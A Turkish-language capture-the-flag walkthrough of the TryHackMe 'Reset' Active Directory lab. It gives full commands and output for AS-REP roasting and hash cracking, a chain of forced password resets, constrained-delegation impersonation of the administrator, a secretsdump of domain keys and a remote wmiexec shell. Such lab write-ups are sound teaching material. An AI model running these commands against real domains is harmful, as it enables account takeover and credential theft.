---

title: THM - Reset
author: Acivik
date: 2026-07-03 08:00:00 +0300 
categories: [CTF, TryHackMe]
tags: [tryhackme, ad, active directory, writeup, ctf, walkthrough, windows]

---

# Enumeration
## Nmap
Hedef sistemin açık portlarını belirlemek için klasik bir nmap taraması yapıyoruz:

```
┌──(root㉿kali)-[~/thm/reset]
└─# nmap -p- -Pn -sV -sC -T4 10.112.180.16    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-10 05:02 -0400
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-10 09:03:47Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: thm.corp, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: thm.corp, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Issuer: commonName=HayStack.thm.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-09T08:56:59
| Not valid after:  2026-12-09T08:56:59
| MD5:     36e9 0dcf 19cd 0cc9 b5c3 bff4 c3df ca59
| SHA-1:   4f69 4186 334b 8777 974b e091 5128 5641 ef6d a8f5
| SHA-256: 5817 e911 572c 07a2 cc71 0c71 bc4c 00bf 0742 4ef1 da10 e239 99a0 7132 3c1f ee46
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQdZBo4atvJYlMfbUeYGI3bzANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFIYXlTdGFjay50aG0uY29ycDAeFw0yNjA2MDkwODU2NTlaFw0y
| NjEyMDkwODU2NTlaMBwxGjAYBgNVBAMTEUhheVN0YWNrLnRobS5jb3JwMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy1URu3cN5bT+RKeGZG6QmxyjVkMy
| k9DbZz4ve+BSOKn3vxIisDPB9Z5GH/OUJBVC5+QXcWI6jhCtbtYlZdcZ5aQ2PQ9f
| 2fCPseab1dO3notfqarmOklvVK/ud81SxCSSg+4Tkoa3KxOouQ65O+Zk6HJs3+Uc
| p16/Q+QZZviVJSRnS+mkNmNrlIx5s7R9+B2uDUJ1XPVXCmt/lbYNn1oKgsn8qnzn
| XfDrwbsAFpyTNDfVU3smZdiQQ9lZYcWa9Qn6rP497MAdX4D3fkhH6KLZ9zptghvC
| IQdouX+ZOSMnld9ZgkF709OPqTjAhWll0olQBWxkuOd9ksgcx2EU9leaBQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAFQ8jmmrzYodjgSJne/HTMtOBJ+vJM3cVwUUlL+GmmyZ5axmjXXa
| HA3EaQGZUI1yGFsH1w/AMay0COnp340WKavU95cQ4+5UcU93DvTSMz+iyxAFmoPf
| d9n/2pIjka0sURy7bmkZaeAH1NfxAWKuJE0V6HJKQie5ViTLiW152Ktq3TxtbzFQ
| 5zO4JP9d4MVfPiMvPjOl2ZE7By/Ndiq7htZUSeVMGWllFN3ZUQT/eGSaPBmft4tV
| YCJohCC1OSJQPA3MDirk2pNz+oJM+lMnAcFAWGHGuc933mULJWOsZFJdfWBmic53
| 8yLecFEVO3lMFQp2Gny+dD9Ehs/os7HFzNk=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-10T09:04:36+00:00
|_ssl-date: 2026-06-10T09:05:16+00:00; 0s from scanner time.
7680/tcp  open  tcpwrapped    syn-ack ttl 126
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-10T09:04:38
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 37491/tcp): CLEAN (Timeout)
|   Check 2 (port 45756/tcp): CLEAN (Timeout)
|   Check 3 (port 63387/udp): CLEAN (Timeout)
|   Check 4 (port 17477/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
                                   
┌──(root㉿kali)-[~/thm/reset]
└─#
```

``thm.corp, HayStack.thm.corp``
Bulduğumuz domainleri `/etc/hosts` dosyasına kaydedelim ve devam edelim.

## SMB

Öncelikle guest  erişimine izin veriliyor mu kontrol ediyorum ve paylaşımları listeliyorum. Daha sonrasında sistemdeki kullanıcı isimlerini topluyorum.

![https://i.ibb.co/3YF2S0GP/image.png](https://i.ibb.co/3YF2S0GP/image.png)

Data share'e okuma, yazma yetkimiz var.

![https://i.ibb.co/q3GHH7fr/image.png](https://i.ibb.co/q3GHH7fr/image.png)

İçerisinde bir takım pdf,txt dosyaları yer almakta.

![https://i.ibb.co/HTLZdgHf/image.png](https://i.ibb.co/HTLZdgHf/image.png)

LILY ONEILL kullanıcısının parolasını görmekteyiz.


# Initial Access

Öncelikle elimdeki kullanıcı listesi ile pre_auth özelliği kapalı olan kullanıcıları tespit etmek için bir impacket dosyası çalıştırdım.

![https://i.ibb.co/1tqcz2jy/image.png](https://i.ibb.co/1tqcz2jy/image.png)

Elde ettiğim hash'leri `hashcat` yardımı ile kırmaya çalışıyorum.

```
┌──(root㉿kali)-[~/thm/reset]
└─# hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt --force
[...]
$krb5asrep$23$TABATHA_BRITT@THM.CORP:db0f36931818857ec42b61dba4c8ca5e$ae146e99d814bab0c13a26c163ec345294595129a71a8a279f4516380742316622bf7a8ac85bc84956a532c24d5cc72873b4dded9bacb7d24bddb7f9828a9d2a0144b8d29bf0290da5f488c05b9330ebba764f45a938d9ade2b29eec32d84a2c3a3a35d10dfd72081e75de637dc59ee1b4e5c072789c5c567ddf9788bd5bb09ce3ce1f8d56739de95b98cf980f52b126cce3f1279e270b4ad06cd29f23f5e63fa0d68e0ec90a2475b5a82162332c51722c264756ebb956f77783dfbbcf7d434fdee797f2539e7fa77ac2ee6cba7054d5d2f461d8e0db4b90fcbc1c63e8c3ed70f79d6bdf:marlboro(1985)
```

``TABATHA_BRITT`` kullanıcısına da sahibiz.
Elimdeki kimlik bilgilerini kullanarak kerberostable servis hesaplarını inceliyorum.

![https://i.ibb.co/JRcX8vtN/image.png](https://i.ibb.co/JRcX8vtN/image.png)

Buradaki servislerin hashlerini kırmaya çalıştım fakat başarısızlık.

# BloodHound

![https://i.ibb.co/d4szPMKL/image.png](https://i.ibb.co/d4szPMKL/image.png)

Bloodhound aracı ile ad yapısını incelediğimizde bir yol keşfediyoruz.
Bu yol darla kullanıcısına gidene kadar parola değiştirme işlemini tekrar ediyor.

```
┌──(root㉿kali)-[~/tools/windows]
└─# pth-net rpc password "SHAWNA_BRAY" 'Password123!' -U "thm.corp"/"TABATHA_BRITT"%'marlboro(1985)' -S 10.114.182.60 
Password for [THM.CORP\TABATHA_BRITT]:
E_md4hash wrapper called.
                                                                                                                     
┌──(root㉿kali)-[~/tools/windows]
└─# nxc smb 10.114.182.60 -u 'SHAWNA_BRAY' -p 'Password123!'
SMB         10.114.182.60   445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.114.182.60   445    HAYSTACK         [+] thm.corp\SHAWNA_BRAY:Password123! 
                                                                                                                     
┌──(root㉿kali)-[~/tools/windows]
└─# pth-net rpc password "CRUZ_HALL" 'Password123!' -U "thm.corp"/"SHAWNA_BRAY"%'Password123!' -S 10.114.182.60
E_md4hash wrapper called.
                                                                                                                     
┌──(root㉿kali)-[~/tools/windows]
└─# pth-net rpc password "DARLA_WINTERS" 'Password123!' -U "thm.corp"/"CRUZ_HALL"%'Password123!' -S 10.114.182.60
E_md4hash wrapper called.
                                                                                                                     
┌──(root㉿kali)-[~/tools/windows]
└─# 
```

En son darla kullanıcısına erişim sağladık.

![https://i.ibb.co/FrxKtfY/image.png](https://i.ibb.co/FrxKtfY/image.png)

``DARLA_WINTERS`` hesabının delegation yetkisi var yani DARLA_WİNTERS, ``HAYSTACK`` sunucusu için "başkasının kimliğiyle gidebilme" yetkisi var.

```
──(root㉿kali)-[~/thm/reset]
└─# faketime "$(ntpdate -q 10.114.138.148 | cut -d ' ' -f 1-3)" impacket-getST -spn cifs/HayStack.thm.corp -impersonate administrator -dc-ip 10.114.138.148 thm.corp/DARLA_WINTERS -hashes :2b576acbe6bcfda7294d6bd18041b8fe
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_HayStack.thm.corp@THM.CORP.ccache
                                                                                                                     
┌──(root㉿kali)-[~/thm/reset]
└─# export KRB5CCNAME=administrator@cifs_HayStack.thm.corp@THM.CORP.ccache
                                                                                                                     
┌──(root㉿kali)-[~/thm/reset]
└─# impacket-secretsdump -k -no-pass administrator@HayStack.thm.corp -dc-ip 10.114.138.148 -target-ip 10.114.138.148 -just-dc-user Administrator 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:067a84e5afaed843ed4a8fdac5facac3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f2313ddc9686cd8ea1e67586173d3218bdc897a3c717dea005d31d8280291d75
Administrator:aes128-cts-hmac-sha1-96:a221004822c82f96664e247308ce6904
Administrator:des-cbc-md5:1cdac7ae988a5b32
[*] Cleaning up... 
                                                                                                                     
┌──(root㉿kali)-[~/thm/reset]
└─#
```

Darla kullanıcısının kimlik bilgileri ile admin adına bir service ticket talep ediyorum. Kerberos işlemleri için saat farkına dikkat edelim. Bunun için faketime komutunu kullanıyorum.

Ticket'ı kaydettikten sonra DCSync gerçekleştirebilirim. Veya direkt shell alabilirim.

```
┌──(root㉿kali)-[~/thm/reset]
└─# impacket-wmiexec -k -no-pass -dc-ip 10.114.138.148 administrator@HayStack.thm.corp -target-ip 10.114.138.148
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator

C:\>cd Users
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

08/21/2023  08:33 PM    <DIR>          .
08/21/2023  08:33 PM    <DIR>          ..
07/10/2023  10:23 AM    <DIR>          Administrator
01/26/2024  09:02 PM    <DIR>          automate
06/13/2026  06:24 PM    <DIR>          CECILE_WONG
06/16/2023  04:17 PM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  12,385,644,544 bytes free

C:\Users>cd Administrator
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

07/14/2023  07:23 AM    <DIR>          .
07/14/2023  07:23 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/16/2023  04:37 PM                30 root.txt
               3 File(s)          1,111 bytes
               2 Dir(s)  12,385,447,936 bytes free

C:\Users\Administrator\Desktop>type root.txt
THM{RE_RE_RE_SET_AND_DELEGATE}
C:\Users\Administrator\Desktop>
```
vesselam.
